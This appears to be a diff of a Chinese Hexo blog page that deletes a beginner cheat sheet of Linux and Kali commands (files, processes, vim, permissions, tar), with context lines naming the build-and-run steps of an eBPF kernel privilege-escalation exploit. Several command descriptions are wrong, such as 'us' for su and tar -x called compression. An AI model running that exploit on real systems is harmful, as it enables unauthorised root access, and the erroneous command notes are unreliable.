-<p><strong>ls</strong> 显示目录下文件 </p>
-<ul>
-<li>-l    列出文件详细信息</li>
-<li>-a   列出当前目录下所有文件及目录，包括隐藏文件</li>
-</ul>
-<p><strong>mkdir</strong> 创建目录</p>
-<ul>
-<li>-p 创建目录，若无父目录，则创建p(parent)</li>
-</ul>
-<p><strong>pwd</strong> 查看当前工作目录</p>
-<p><strong>cp</strong>:复制文件</p>
-<p><strong>cd</strong> #切换目录</p>
-<ul>
-<li>cd ~ #跳到自己的home目录</li>
-</ul>
-<p><strong>touch:</strong>创建空文件</p>
-<p><strong>echo:</strong>创建带有内容的文件</p>
-<p><strong>cat</strong> 查看文件内容</p>
-<ul>
-<li>n 或 –number：由 1 开始对所有输出的行数编号。</li>
-<li>-b 或 –number-nonblank：和 -n 相似，只不过对于空白行不编号。</li>
-<li>-s 或 –squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行。</li>
-<li>-v 或 –show-nonprinting：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外。</li>
-<li>-E 或 –show-ends : 在每行结束处显示 $。</li>
-<li>-T 或 –show-tabs: 将 TAB 字符显示为 ^I。</li>
-<li>-A, –show-all：等价于 -vET。</li>
-<li>-e：等价于”-vE”选项；</li>
-<li>-t：等价于”-vT”选项；</li>
-</ul>
-<p><strong>fInd</strong>  在文件系统中搜索某文件</p>
-<ul>
-<li>​    find / name <em>xxx\</em>.c  #模糊查找目录下的文件<ul>
-<li>​    find /var/log -type f -mtime +7  -ok rm {} \  #查找/var/log目录中更改时间在7日以前的普通文                                                                                    件，并在删除之前询问它们： </li>
-<li>find . -type f -perm 644 -exec ls -l {} \   #查找前目录中文件属主具有读写权限                                                                    </li>
-</ul>
-</li>
-</ul>
-<p><strong>wc</strong> 统计文本中行数、字数、字符数</p>
-<p><strong>grep</strong> 在文本文件中查找某个字符串</p>
-<ul>
-<li>grep “被查找的字符串“ 文件名</li>
-<li>grep  -e “正则表达式“ 文件名</li>
-<li>grep -i  “被查找的字符串” 文件名    #忽略大小写</li>
-</ul>
-<p><strong>pwd</strong> 显示当前目录</p>
-<p><strong>more less</strong> 分页显示文本文件内容</p>
-<p><strong>head tail</strong> 显示文件头、尾内容</p>
-<p><strong>mv</strong> 移动或重命名</p>
-<p><strong>us</strong> #切换管理员目录</p>
-<p><strong>./文件名</strong>  #执行文件</p>
-<p><strong>rm</strong> 文件名 #删除文件</p>
-<p><strong>rm -r</strong> 文件夹名 #删除文件夹</p>
-<h5 id="二、Linux系统管理命令"><a href="#二、Linux系统管理命令" class="headerlink" title="二、Linux系统管理命令"></a>二、Linux系统管理命令</h5><p><strong>chmod</strong>控制文件如何被他人所调用。</p>
-<p><strong>stat</strong>        显示指定文件的详细信息，比ls更详细</p>
-<p><strong>who</strong>        显示在线登陆用户</p>
-<p><strong>whoami</strong>      显示当前操作用户</p>
-<p><strong>hostname</strong>    显示主机名</p>
-<p><strong>uname</strong>      显示系统信息</p>
-<p><strong>top</strong>         动态显示当前耗费资源最多进程信息</p>
-<p><strong>ps</strong>          显示瞬间进程状态 ps -au</p>
-<ul>
-<li>ps -A    #显示进程信息</li>
-<li>ps -u root     #显示root用户进程信息</li>
-<li>ps -aux      # 显示所有包含其他使用者的行程</li>
-</ul>
-<p><strong>du</strong>          查看目录大小 du -h /home带有单位显示目录信息</p>
-<p><strong>df</strong>          查看磁盘大小 df -h 带有单位显示磁盘信息</p>
-<p><strong>ifconfig</strong>      查看网络情况</p>
-<p><strong>ping</strong>         测试网络连通</p>
-<p><strong>netstat</strong>      显示网络状态信息</p>
-<p><strong>clear</strong>        清屏</p>
-<p><strong>alias</strong>        对命令重命名 如：alias showmeit=”ps -aux” ，另外解除使用unaliax showmeit</p>
-<p><strong>kill</strong>         杀死进程，可以先用ps 或 top命令查看进程的id，然后再用kill命令杀死进程。</p>
-<ul>
-<li>kill -9  $(ps -ef | grep hnlinux)  #过滤出hnlinux用户进程</li>
-<li>kill -u hnlinux  #方法二</li>
-<li>kill -KILL 123456+  #强制杀死进程</li>
-</ul>
-<h5 id="三、vim使用"><a href="#三、vim使用" class="headerlink" title="三、vim使用"></a>三、vim使用</h5><p>vim三种模式：命令模式、插入模式、编辑模式。使用ESC或i或：l来切换模式。</p>
-<p>命令模式下：</p>
-<p><strong>q</strong>            退出</p>
-<p><strong>:q!</strong>           强制退出</p>
-<p><strong>:wq</strong>          保存并退出</p>
-<p><strong>:set number</strong>   显示行号</p>
-<p><strong>:set nonumber</strong>  隐藏行号</p>
-<p><strong>/apache</strong>       在文档中查找apache 按n跳到下一个，shift+n上一个</p>
-<p><strong>yyp</strong>          复制光标所在行，并粘贴</p>
-<p>(左移一个字符←)、j(下一行↓)、k(上一行↑)、l(右移一个字符→)</p>
-<h5 id="四、Kali-Linux目录结构（文件系统）"><a href="#四、Kali-Linux目录结构（文件系统）" class="headerlink" title="四、Kali Linux目录结构（文件系统）"></a>四、Kali Linux目录结构（文件系统）</h5><p><strong>bin</strong> 所有用户都可以使用的程序目录</p>
-<p><strong>boot</strong> 引导程序GRUB等的存放目录</p>
-<p><strong>dev</strong> 存放所有的设备目录</p>
-<p><strong>etc</strong> 主要的存放配置文件的目录</p>
-<p><strong>home</strong> 用户主目录 </p>
-<p><strong>lib</strong> 库文件目录</p>
-<p><strong>live-bulid</strong> build自己的kali版本的目录</p>
-<p><strong>media</strong> 默认挂载外接存储的目录</p>
-<p><strong>mnt</strong> 以前的linux常用的挂载目录</p>
-<p><strong>usr</strong> 存放执行程序、共享文件</p>
-<p><strong>var</strong> 存放日志、邮件等经常变化的内容。</p>
-<h5 id="五、文件读写权限"><a href="#五、文件读写权限" class="headerlink" title="五、文件读写权限"></a>五、文件读写权限</h5><p>三种基本权限</p>
-<p><strong>R</strong>      读     数值表示为4</p>
-<p><strong>W</strong>     写     数值表示为2</p>
-<p><strong>X</strong>      可执行  数值表示为1</p>
-<h5 id="六、打包压缩命令"><a href="#六、打包压缩命令" class="headerlink" title="六、打包压缩命令"></a>六、打包压缩命令</h5><p><strong>gzip：</strong></p>
-<ul>
-<li>gzip *            #压缩目录下的所有文件</li>
-<li>gzip -dv *    #解压文件，并列出详细信息</li>
-</ul>
-<p><strong>bzip2：</strong></p>
-<p><strong>tar:</strong>         打包压缩</p>
-<p>   <strong>-c</strong>        归档文件</p>
-<p>   <strong>-x</strong>        压缩文件</p>
-<p>   <strong>-z</strong>        gzip压缩文件</p>
-<p>   <strong>-j</strong>        bzip2压缩文件</p>
-<p>   <strong>-v</strong>        显示压缩或解压缩过程 v(view)</p>
-<p>   <strong>-f</strong>        使用档名</p>
-<p>例：</p>
-<p><strong>tar -cvf /home/abc.tar /home/abc</strong>        只打包，不压缩</p>
-<p><strong>tar -zcvf /home/abc.tar.gz /home/abc</strong>     打包，并用gzip压缩</p>
-<p><strong>tar -jcvf /home/abc.tar.bz2 /home/abc</strong>    打包，并用bzip2压缩</p>
-<p>当然，如果想解压缩，就直接替换上面的命令 tar -cvf / tar -zcvf / tar -jcvf 中的“c” 换成“x” 就可以了。</p>
-<h5 id="七、linux管道"><a href="#七、linux管道" class="headerlink" title="七、linux管道"></a>七、linux管道</h5><p>将一个命令的标准输出作为另一个命令的标准输入</p>
-<p>例：grep -r “close” /home/* | more    在home目录下所有文件中查找，包括close的文件，并分页输出。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3573,7 +3471,7 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">38</span>
+                  <span class="site-state-item-count">39</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3595,7 +3493,7 @@ cd ebpf_mapfd_doubleput_exploit</code></pre><p>依次执行./compile.sh   </p>
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
